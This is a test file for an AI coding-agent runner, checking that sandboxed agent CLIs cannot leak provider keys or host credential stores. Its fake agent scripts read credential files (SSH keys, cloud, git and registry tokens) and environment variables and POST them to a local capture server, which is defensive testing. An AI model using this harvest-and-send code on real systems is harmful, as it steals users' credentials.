import assert from "node:assert/strict";
import { chmodSync, mkdtempSync, mkdirSync, readdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { createServer } from "node:http";
import { tmpdir } from "node:os";
import { delimiter, join } from "node:path";
import { test } from "node:test";
import { CODEX_ADAPTER } from "../../src/agents/codex.ts";
import { KIMI_ADAPTER } from "../../src/agents/kimi.ts";
import { MIMO_ADAPTER } from "../../src/agents/mimo.ts";
import { CLAUDE_CODE_ADAPTER } from "../../src/agents/claude-code.ts";
import { runAgent } from "../../src/agents/runner.ts";
import { Journal } from "../../src/journal/journal.ts";

test("an injected credential is redacted from output and withheld from changed-file artifacts", async () => {
  const root = mkdtempSync(join(tmpdir(), "credential-redaction-"));
  const workspace = join(root, "workspace");
  const state = join(root, "state");
  const bin = join(root, "bin");
  const home = join(root, "operator-home");
  mkdirSync(workspace);
  mkdirSync(bin);
  mkdirSync(home);
  const secret = "never-persist-this-provider-key-7a9d";
  writeFileSync(join(workspace, "existing-secret.txt"), secret);
  const cli = join(bin, "codex");
  writeFileSync(cli, `#!/usr/bin/env node
import { unlinkSync, writeFileSync } from 'node:fs';
writeFileSync('leak.txt', process.env.TEST_PROVIDER_KEY);
unlinkSync('existing-secret.txt');
await new Promise((resolve) => setTimeout(resolve, 500));
console.log(JSON.stringify({ type: 'thread.started', thread_id: 'credential-test' }));
console.log(JSON.stringify({ type: 'turn.started' }));
console.log(JSON.stringify({ type: 'item.completed', item: { id: 'i0', type: 'agent_message', text: process.env.TEST_PROVIDER_KEY } }));
console.log(JSON.stringify({ type: 'turn.completed', usage: { input_tokens: 1, output_tokens: 1 } }));
console.error(process.env.TEST_PROVIDER_KEY);
`);
  chmodSync(cli, 0o755);
  const journal = Journal.open(state, "credential-test");
  try {
    let finished = false;
    let sawEnvLauncher = false;
    const running = runAgent({
      profile: { id: "codex-credential-test", description: "credential test", role: "writer", argv: ["codex"], parser: "codex-jsonl", timeoutMs: 10_000, tags: [], enabled: true },
      adapter: CODEX_ADAPTER,
      prompt: "write a file",
      workspaceRoot: workspace,
      runId: "credential-test",
      taskId: null,
      journal,
      generation: 1,
      envSource: { PATH: `${bin}${delimiter}${process.env["PATH"] ?? ""}`, HOME: home, TEST_PROVIDER_KEY: secret },
      provider: { id: "test-provider", baseUrl: "https://models.example/v1", apiKeyEnv: "TEST_PROVIDER_KEY", model: "test-model", protocol: "openai-compatible" },
    }).finally(() => { finished = true; });
    const deadline = Date.now() + 5_000;
    while (!finished && Date.now() < deadline) {
      for (const entry of readdirSync("/proc")) {
        if (!/^\d+$/.test(entry)) continue;
        try {
          const commandLine = readFileSync(`/proc/${entry}/cmdline`);
          if (commandLine.includes(Buffer.from("synapser-env-launcher"))) sawEnvLauncher = true;
          assert.equal(commandLine.includes(Buffer.from(secret)), false, "provider key must never appear in host-visible process arguments");
        } catch (error) {
          // A process may exit between enumerating /proc and opening cmdline.
          if (!["ENOENT", "EACCES", "ESRCH"].includes((error as NodeJS.ErrnoException).code ?? "")) throw error;
        }
      }
      await new Promise((resolve) => setTimeout(resolve, 20));
    }
    const result = await running;
    assert.equal(sawEnvLauncher, true, "the real bwrap command must use the stdin-only environment bridge");
    assert.equal(result.outcome, "FAILED");
    assert.equal(result.reason, "provider credential appeared in an agent output file; change withheld");
    assert.deepEqual(result.changes, []);
    assert.equal(JSON.stringify(result).includes(secret), false);
    const row = journal.listAgentRuns()[0]!;
    for (const blob of [row.stdoutBlob, row.stderrBlob, row.finalTextBlob]) {
      if (blob) assert.equal(journal.artifacts.get(blob).includes(Buffer.from(secret)), false);
    }
  } finally {
    journal.close();
    rmSync(root, { recursive: true, force: true });
  }
});

test("provider-injected Claude cannot read any host credential stores, including its approved login overlay", async () => {
  const root = mkdtempSync(join(tmpdir(), "credential-surface-"));
  const workspace = join(root, "workspace");
  const state = join(root, "state");
  const bin = join(root, "bin");
  const home = join(root, "operator-home");
  mkdirSync(workspace);
  mkdirSync(bin);
  mkdirSync(home);
  const markers = ["CLAUDE-CREDENTIAL", "CLAUDE-JSON-CREDENTIAL", "SSH-CREDENTIAL", "NETRC-CREDENTIAL", "GIT-CREDENTIAL", "GH-CREDENTIAL", "AWS-CREDENTIAL", "AZURE-CREDENTIAL", "GCLOUD-CREDENTIAL", "KUBE-CREDENTIAL", "DOCKER-CREDENTIAL", "NPM-CREDENTIAL", "PYPI-CREDENTIAL"];
  const entries: [string, string][] = [
    [".claude/.credentials.json", markers[0]!], [".claude.json", markers[1]!],
    [".ssh/id_ed25519", markers[2]!], [".netrc", markers[3]!], [".gitconfig", markers[4]!],
    [".config/gh/hosts.yml", markers[5]!], [".aws/credentials", markers[6]!], [".azure/accessTokens.json", markers[7]!],
    [".config/gcloud/credentials.db", markers[8]!], [".kube/config", markers[9]!], [".docker/config.json", markers[10]!],
    [".npmrc", markers[11]!], [".pypirc", markers[12]!],
  ];
  for (const [path, value] of entries) {
    const file = join(home, path);
    mkdirSync(join(file, ".."), { recursive: true });
    writeFileSync(file, value);
  }

  const received: string[] = [];
  const server = createServer((req, res) => {
    const chunks: Buffer[] = [];
    req.on("data", (chunk: Buffer) => chunks.push(chunk));
    req.on("end", () => {
      received.push(Buffer.concat(chunks).toString("utf8"));
      res.statusCode = 200;
      res.end("{}");
    });
  });
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  const address = server.address();
  assert.ok(address && typeof address !== "string");
  const baseUrl = `http://127.0.0.1:${address.port}`;
  const cli = join(bin, "claude");
  writeFileSync(cli, `#!/usr/bin/env node
import { readdirSync, readFileSync, statSync } from 'node:fs';
import { join } from 'node:path';
const values = [];
function walk(path) { try { for (const name of readdirSync(path)) { const file = join(path, name); if (statSync(file).isDirectory()) walk(file); else values.push(readFileSync(file, 'utf8')); } } catch {} }
walk(process.env.HOME);
await fetch(process.env.ANTHROPIC_BASE_URL + '/capture', { method: 'POST', body: values.join('\\n') });
console.log(JSON.stringify({ type: 'result', subtype: 'success', is_error: false, result: 'ok', usage: { input_tokens: 1, output_tokens: 1 } }));
`);
  chmodSync(cli, 0o755);
  const journal = Journal.open(state, "credential-surface-test");
  try {
    const result = await runAgent({
      profile: { id: "claude-credential-test", description: "credential test", adapter: "claude-code", role: "writer", argv: [], model: "sonnet", homeOverlay: [".claude", ".claude.json"], parser: "claude-json", timeoutMs: 10_000, tags: [], enabled: true },
      adapter: CLAUDE_CODE_ADAPTER,
      prompt: "inspect settings",
      workspaceRoot: workspace,
      runId: "credential-surface-test",
      taskId: null,
      journal,
      generation: 1,
      envSource: { PATH: `${bin}${delimiter}${process.env["PATH"] ?? ""}`, HOME: home, TEST_PROVIDER_KEY: "test-key" },
      provider: { id: "local-test", baseUrl, apiKeyEnv: "TEST_PROVIDER_KEY", model: "test-model", protocol: "anthropic" },
    });
    assert.equal(result.outcome, "SUCCEEDED", result.reason ?? "");
    assert.equal(received.length, 1);
    for (const marker of markers) assert.equal(received[0]!.includes(marker), false, `${marker} reached the endpoint`);
  } finally {
    journal.close();
    await new Promise<void>((resolve) => server.close(() => resolve()));
    rmSync(root, { recursive: true, force: true });
  }
});

test("every provider-injected CLI adapter keeps host credential stores out of its isolated HOME and child environment", async () => {
  const root = mkdtempSync(join(tmpdir(), "credential-adapter-matrix-"));
  const workspace = join(root, "workspace");
  const state = join(root, "state");
  const bin = join(root, "bin");
  const home = join(root, "operator-home");
  mkdirSync(workspace);
  mkdirSync(bin);
  mkdirSync(home);
  const entries: [string, string][] = [
    [".claude/.credentials.json", "MATRIX-CLAUDE-CREDENTIAL"], [".claude.json", "MATRIX-CLAUDE-JSON-CREDENTIAL"],
    [".codex/auth.json", "MATRIX-CODEX-CREDENTIAL"], [".kimi-code/config.toml", "MATRIX-KIMI-CREDENTIAL"],
    [".config/mimocode/mimocode.jsonc", "MATRIX-MIMO-CREDENTIAL"], [".ssh/id_ed25519", "MATRIX-SSH-CREDENTIAL"],
    [".netrc", "MATRIX-NETRC-CREDENTIAL"], [".gitconfig", "MATRIX-GIT-CREDENTIAL"],
    [".git-credentials", "MATRIX-GIT-STORE-CREDENTIAL"], [".config/gh/hosts.yml", "MATRIX-GH-CREDENTIAL"],
    [".aws/credentials", "MATRIX-AWS-CREDENTIAL"], [".azure/accessTokens.json", "MATRIX-AZURE-CREDENTIAL"],
    [".config/gcloud/credentials.db", "MATRIX-GCLOUD-CREDENTIAL"], [".kube/config", "MATRIX-KUBE-CREDENTIAL"],
    [".docker/config.json", "MATRIX-DOCKER-CREDENTIAL"], [".npmrc", "MATRIX-NPM-CREDENTIAL"],
    [".pypirc", "MATRIX-PYPI-CREDENTIAL"], [".config/opencode/auth.json", "MATRIX-OPENCODE-CREDENTIAL"],
    [".cursor/auth.json", "MATRIX-CURSOR-CREDENTIAL"], [".gemini/oauth_creds.json", "MATRIX-GEMINI-CREDENTIAL"],
  ];
  const markers = entries.map(([, value]) => value);
  for (const [path, value] of entries) {
    const file = join(home, path);
    mkdirSync(join(file, ".."), { recursive: true });
    writeFileSync(file, value);
  }

  const received: string[] = [];
  const server = createServer((req, res) => {
    const chunks: Buffer[] = [];
    req.on("data", (chunk: Buffer) => chunks.push(chunk));
    req.on("end", () => {
      received.push(Buffer.concat(chunks).toString("utf8"));
      res.writeHead(200, { "content-type": "application/json" });
      res.end("{}");
    });
  });
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  const address = server.address();
  assert.ok(address && typeof address !== "string");
  const baseUrl = `http://127.0.0.1:${address.port}`;
  const cliSource = `#!/usr/bin/env node
import { readdirSync, readFileSync, statSync } from 'node:fs';
import { join } from 'node:path';
const values = [JSON.stringify(process.env)];
function walk(path) { try { for (const name of readdirSync(path)) { const file = join(path, name); if (statSync(file).isDirectory()) walk(file); else values.push(readFileSync(file, 'utf8')); } } catch {} }
walk(process.env.HOME);
await fetch(process.env.LOCAL_CAPTURE_URL, { method: 'POST', body: values.join('\\n') });
`;
  for (const name of ["claude", "codex", "kimi", "mimo"]) {
    const cli = join(bin, name);
    writeFileSync(cli, cliSource);
    chmodSync(cli, 0o755);
  }

  const adapters = [
    { name: "claude", adapter: CLAUDE_CODE_ADAPTER, parser: "claude-json" as const, protocol: "anthropic" as const, overlay: [".claude", ".claude.json"] },
    { name: "codex", adapter: CODEX_ADAPTER, parser: "codex-jsonl" as const, protocol: "openai-compatible" as const, overlay: [] },
    { name: "kimi", adapter: KIMI_ADAPTER, parser: "kimi-stream" as const, protocol: "anthropic" as const, overlay: [] },
    { name: "mimo", adapter: MIMO_ADAPTER, parser: "mimo-json" as const, protocol: "openai-compatible" as const, overlay: [] },
  ];
  const journal = Journal.open(state, "credential-adapter-matrix");
  try {
    for (const item of adapters) {
      const result = await runAgent({
        profile: { id: `${item.name}-credential-matrix`, description: "credential matrix", adapter: item.adapter.id, role: "writer", argv: [], ...(item.name === "claude" ? { model: "sonnet", homeOverlay: item.overlay } : {}), env: { LOCAL_CAPTURE_URL: baseUrl }, parser: item.parser, timeoutMs: 10_000, tags: [], enabled: true },
        adapter: item.adapter,
        prompt: "inspect settings",
        workspaceRoot: workspace,
        runId: `credential-adapter-${item.name}`,
        taskId: null,
        journal,
        generation: 1,
        envSource: {
          PATH: `${bin}${delimiter}${process.env["PATH"] ?? ""}`, HOME: home,
          TEST_PROVIDER_KEY: `provider-key-${item.name}`,
          GH_TOKEN: "MATRIX-ENV-GH-CREDENTIAL", AWS_ACCESS_KEY_ID: "MATRIX-ENV-AWS-CREDENTIAL",
          AZURE_CLIENT_SECRET: "MATRIX-ENV-AZURE-CREDENTIAL", GITHUB_TOKEN: "MATRIX-ENV-GITHUB-CREDENTIAL",
        },
        provider: { id: "local-test", baseUrl, apiKeyEnv: "TEST_PROVIDER_KEY", model: "test-model", protocol: item.protocol },
      });
      assert.notEqual(result.outcome, "FAILED", `${item.name} adapter failed before it could report its credential surface: ${result.reason ?? ""}`);
    }
    assert.equal(received.length, adapters.length, "each adapter reached the local capture endpoint");
    for (const payload of received) {
      for (const marker of markers) assert.equal(payload.includes(marker), false, `${marker} reached the endpoint`);
      for (const marker of ["MATRIX-ENV-GH-CREDENTIAL", "MATRIX-ENV-AWS-CREDENTIAL", "MATRIX-ENV-AZURE-CREDENTIAL", "MATRIX-ENV-GITHUB-CREDENTIAL"])
        assert.equal(payload.includes(marker), false, `${marker} reached the endpoint through the child environment`);
    }
  } finally {
    journal.close();
    await new Promise<void>((resolve) => server.close(() => resolve()));
    rmSync(root, { recursive: true, force: true });
  }
});
